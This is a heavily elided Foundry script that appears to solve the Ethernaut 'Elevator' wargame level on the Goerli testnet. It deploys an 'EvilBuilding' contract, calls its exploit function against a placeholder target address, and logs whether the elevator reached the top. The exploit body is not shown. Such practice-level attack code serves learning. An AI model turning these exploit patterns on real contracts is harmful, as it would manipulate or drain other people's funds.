...
contract ElevatorScript is Script {
    ...
    */
    function setUp() public {
        ...
        if (chainId == 5) { //goerli chian
            ...
            target = Elevator(0x0000000000000000000000000000000000000000); //attach to an existing contract
    ...
    **/
    function run() public {
        ...
        EvilBuilding building = new EvilBuilding();
        building.exploit(address(target));
        vm.stopBroadcast();
        console.log("top : %s", target.top());
    }
}